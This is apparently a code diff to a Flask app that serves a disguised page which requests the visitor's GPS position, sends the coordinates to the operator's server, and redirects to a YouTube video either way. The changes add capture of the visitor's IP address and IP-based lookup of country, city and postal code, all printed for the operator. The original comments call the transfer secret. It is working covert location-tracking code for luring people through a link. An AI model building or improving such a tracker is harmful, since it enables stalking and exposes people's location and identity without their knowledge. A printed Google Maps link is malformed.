@@ -1,5 +1,4 @@
 from flask import Flask, request, render_template_string
-from geopy.geocoders import Nominatim
 import geocoder
 
 app = Flask(__name__)
@@ -25,10 +24,8 @@ PAGINA_SKIBIDI = """
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
-                // Solicita el GPS del celular (Ventana flotante de Permitir/Denegar)
                 navigator.geolocation.getCurrentPosition(enviarDatos, manejarError);
             } else {
-                // Si el dispositivo no tiene GPS, solo redirige
                 window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
             }
         };
@@ -36,14 +33,12 @@ PAGINA_SKIBIDI = """
         function enviarDatos(posicion) {
             let lat = posicion.coords.latitude;
             let lon = posicion.coords.longitude;
-            // Envía las coordenadas en secreto a nuestro servidor Python
             fetch(`/capturar_gps?lat=${lat}&lon=${lon}`).then(() => {
                 window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
             });
         }
 
         function manejarError(error) {
-            // Si el usuario presiona "DENIEGAR", lo manda a YouTube de todos modos
             window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
         }
     </script>
@@ -67,48 +62,38 @@ def capturar_gps():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
 
+    ip_completa = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip_limpia = ip_completa.split(',')[0].strip()
+
     pais = "No encontrado"
     estado = "No encontrado"
     ciudad = "No encontrada"
     codigo_postal = "No encontrado"
-    direccion_completa = "No encontrada"
 
     try:
-
-        g = geocoder.osm([lat, lon], method='reverse')
-        if g.ok:
-            direccion_completa = g.address
-            datos_mapa = g.json
-            pais = datos_mapa.get('country', 'No encontrado')
-            estado = datos_mapa.get('state', 'No encontrado')
-            ciudad = datos_mapa.get('city') or datos_mapa.get('town') or datos_mapa.get('village') or 'No encontrada'
-            codigo_postal = datos_mapa.get('postal', 'No encontrado')
+        g_ip = geocoder.ip(ip_limpia)
+        if g_ip.ok:
+            pais = g_ip.country
+            estado = g_ip.state
+            ciudad = g_ip.city
+            codigo_postal = g_ip.postal
     except Exception as e:
-        direccion_completa = f"Error al traducir: {e}"
+        print(f"Error al decodificar IP: {e}")
 
-
-    print("////////////////////////////////////////////////")
-    print("----------------------------------------------\n")
-    print("\n--- [🔥] UBICACIÓN ---")
-    print(f"Latitud: {lat}")
-    print(f"Longitud: {lon}")
+    print("----------------------------------------------")
+    print("\n--- [🔥] UBICACION ---")
+    print(f"Latitud Exacta (GPS): {lat}")
+    print(f"Longitud Exacta (GPS): {lon}")
+    print(f"Ver en Google Maps: https://google.com{lat},{lon}")
+    print("\n-- Datos Generales de la IP --")
+    print(f"IP Decodificada: {ip_limpia}")
     print(f"País: {pais}")
     print(f"Estado/Región: {estado}")
-    print(f"Ciudad: {ciudad}")
-    print(f"Código Postal: {codigo_postal}")
-    print(f"Dirección Completa: {direccion_completa}") 
-    print(f"Ver en Google Maps: https://google.com{lat},{lon}")
-    print("-----------------------------------------\n")
-    print("--Data--")
-    print(f"País: {g.country}")
-    print(f"Estado/Región: {g.state}")
-    print(f"Ciudad General: {g.city}")
-    print(f"Código Postal de la Central: {g.postal}")
-    print(f"Coordenadas de la Antena (Lat, Lon): {g.latlng}")
+    print(f"Ciudad General: {ciudad}")
+    print(f"Código Postal de la Central: {codigo_postal}")
     print("----------------------------------------------\n")
-    print("////////////////////////////////////////////////")
-    return "OK", 200
 
+    return "OK", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
